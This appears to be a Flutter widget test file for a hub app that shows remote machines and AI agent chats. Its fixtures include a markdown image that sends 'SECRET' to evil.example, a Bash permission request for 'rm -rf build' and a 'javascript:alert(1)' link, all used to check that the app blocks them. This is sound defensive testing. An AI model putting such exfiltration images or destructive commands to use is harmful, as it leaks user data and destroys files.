import 'dart:convert';

import 'package:escanor/core/storage.dart';
import 'package:escanor/core/theme.dart';
import 'package:escanor/features/machines/hub_api.dart';
import 'package:escanor/features/machines/hub_app.dart';
import 'package:escanor/features/machines/hub_markdown.dart';
import 'package:escanor/features/machines/hub_socket.dart';
import 'package:escanor/features/machines/hub_state.dart';
import 'package:escanor/features/machines/hub_store.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:http/http.dart' as http;
import 'package:http/testing.dart';

import 'fakes.dart';

Widget app(Widget child) => ProviderScope(
      child: MaterialApp(
        theme: buildTheme(EscanorColors.of(ThemeName.dark, AccentName.gold), reduceMotion: true),
        home: Scaffold(body: child),
      ),
    );

void main() {
  const creds = HubCredentials();
  final sent = <http.Request>[];
  final sockets = <FakeSocket>[];

  final vm = {'id': 'v1', 'name': 'build-box', 'connected': true, 'lastSeenAt': null, 'accounts': []};
  final session = {
    'id': 's1', 'vmId': 'v1', 'cwd': '/w', 'title': 'Fix the tests', 'createdAt': '2026-10-07T10:00:00Z', //
    'lastMessageAt': '2026-10-07T10:00:00Z', 'status': 'idle', 'accountId': 'default',
  };
  var id = 0;
  Map<String, dynamic> row(Map<String, dynamic> m) => {'id': ++id, 'sessionId': 's1', 'vmId': 'v1', 'message': m, 'createdAt': '2026-10-07T10:00:00Z'};
  final messages = [
    row({'type': 'user', 'local': true, 'message': {'content': [{'type': 'text', 'text': 'run the tests'}]}}),
    row({'type': 'assistant', 'message': {'content': [
      {'type': 'text', 'text': 'Running them. ![x](https://evil.example/?d=SECRET)\n\n```dart\nvoid main() {}\n```'},
      {'type': 'tool_use', 'id': 't1', 'name': 'Edit', 'input': {'file_path': '/w/a.dart', 'old_string': 'a', 'new_string': 'b'}},
    ]}}),
    row({'type': 'user', 'message': {'content': [{'type': 'tool_result', 'tool_use_id': 't1', 'content': 'ok'}]}}),
    row({'type': 'permission_request', 'requestId': 'r1', 'toolName': 'Bash', 'input': {'command': 'rm -rf build'}}),
  ];

  setUp(() async {
    await Storage.initForTest();
    creds.hubUrl = 'https://hub.example.test';
    creds.token = 'tok';
    sent.clear();
    sockets.clear();
    HubStore.instance = HubStore(
      api: HubApi(
        credentials: creds,
        client: MockClient((req) async {
          sent.add(req);
          final p = req.url.path;
          if (p == '/api/vms') return http.Response(jsonEncode([vm]), 200);
          if (p == '/api/vms/v1/sessions') return http.Response(jsonEncode([session]), 200);
          if (p == '/api/vms/v1/projects') return http.Response(jsonEncode(['app']), 200);
          if (p.endsWith('/messages')) return http.Response(jsonEncode(messages), 200);
          if (p == '/api/mcp-servers') return http.Response(jsonEncode({'servers': [], 'vms': []}), 200);
          return http.Response('{"ok":true}', 202);
        }),
      ),
      socket: HubSocket(connector: (u, p) => (sockets..add(FakeSocket(u, p))).last, token: () => creds.token, hubUrl: () => creds.hubUrl),
      credentials: creds,
    );
  });

  testWidgets('on a phone: the machines list, then a chat; a permission prompt is answered from it', (tester) async {
    tester.view.physicalSize = const Size(400, 860);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.reset);
    await tester.pumpWidget(app(const HubApp()));
    await tester.pumpAndSettle();
    expect(find.text('build-box'), findsOneWidget);
    expect(find.text('Online · 1 chat'), findsOneWidget);
    expect(find.text('Connect to Escanor'), findsOneWidget);
    await tester.tap(find.text('Fix the tests'));
    await tester.pumpAndSettle();

    expect(find.text('Fix the tests'), findsOneWidget); // the chat's header
    expect(find.text('run the tests'), findsOneWidget);
    expect(find.text('Bash command'), findsOneWidget);
    expect(find.text('Do you want to proceed?'), findsOneWidget);
    expect(find.byType(Image), findsNothing, reason: 'a remote markdown image is never loaded');
    expect(find.text('[image: x]'), findsOneWidget);

    await tester.tap(find.text('1. Yes'));
    await tester.pumpAndSettle();
    final answer = sent.lastWhere((r) => r.url.path.endsWith('/permission-response'));
    expect(jsonDecode(answer.body), {'requestId': 'r1', 'behavior': 'allow'});
    expect(find.text('Do you want to proceed?'), findsNothing);

    await tester.tap(find.byTooltip('Back'));
    await tester.pumpAndSettle();
    expect(find.text('build-box'), findsOneWidget);
    HubStore.instance.logout();
    await tester.pumpAndSettle();
    expect(find.text('Your hub'), findsOneWidget);
  });

  testWidgets('wide: the list and the chat side by side', (tester) async {
    tester.view.physicalSize = const Size(1200, 900);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.reset);
    await tester.pumpWidget(app(const HubApp(embedded: true)));
    await tester.pumpAndSettle();
    // Opening a machine starts on a new chat for it, with its folders to pick from.
    expect(find.text('Start a new chat on build-box'), findsOneWidget);
    expect(find.text('Workspace root'), findsOneWidget);
    await tester.tap(find.text('Fix the tests'));
    await tester.pumpAndSettle();
    expect(find.text('run the tests'), findsOneWidget);
    expect(find.text('Workspace root'), findsNothing, reason: 'the folder is chosen only for a new chat');
    await tester.tap(find.text('New chat'));
    await tester.pumpAndSettle();
    expect(find.text('Start a new chat on build-box'), findsOneWidget);
  });

  testWidgets('signed out of the hub: its sign-in refuses plain http', (tester) async {
    creds.token = null;
    HubStore.instance.dispatch(const SetAuthed(false));
    await tester.pumpWidget(app(HubApp(onBack: () {})));
    await tester.pumpAndSettle();
    expect(find.text('Your hub'), findsOneWidget);
    expect(find.text('← Back to Escanor'), findsOneWidget);
    await tester.enterText(find.byType(TextField).first, 'http://hub.example.test');
    await tester.enterText(find.byType(TextField).last, 'pw');
    await tester.pump();
    await tester.tap(find.text('Sign in'));
    await tester.pumpAndSettle();
    expect(find.textContaining('A hub must start with https://'), findsOneWidget);
  });

  testWidgets('each machine and each chat has its own settings sheet', (tester) async {
    tester.view.physicalSize = const Size(400, 900);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.reset);
    await tester.pumpWidget(app(const HubApp()));
    await tester.pumpAndSettle();

    await tester.tap(find.byTooltip('Machine settings'));
    await tester.pumpAndSettle();
    expect(find.text('Machine settings'), findsOneWidget);
    expect(find.text('NEW CHATS ON THIS MACHINE'), findsOneWidget);
    expect(find.text('Remove machine'), findsOneWidget);
    await tester.tap(find.text('Close'));
    await tester.pumpAndSettle();

    await tester.longPress(find.text('Fix the tests'));
    await tester.pumpAndSettle();
    expect(find.text('Chat settings'), findsOneWidget);
    expect(find.text('THIS CHAT RUNS WITH'), findsOneWidget);
    expect(find.text('Delete chat'), findsOneWidget);
    await tester.tap(find.text('Permissions'));
    await tester.pumpAndSettle();
    await tester.tap(find.text('Auto'));
    await tester.pumpAndSettle();
    expect(sent.any((r) => r.url.path == '/api/vms/v1/sessions/s1/permission-mode' && r.body == '{"mode":"auto"}'), isTrue);
    expect(HubStore.instance.savedChoices('v1', 's1')!.mode, 'auto');
    await tester.tap(find.text('Close'));
    await tester.pumpAndSettle();
    HubStore.instance.logout();
    await tester.pumpAndSettle();
  });

  test('links: only http(s); images become their alt text', () {
    expect(isSafeLink('https://example.com'), isTrue);
    expect(isSafeLink('javascript:alert(1)'), isFalse);
    expect(blockedImageText('diagram'), '[image: diagram]');
    expect(blockedImageText(null), '[image]');
  });
}
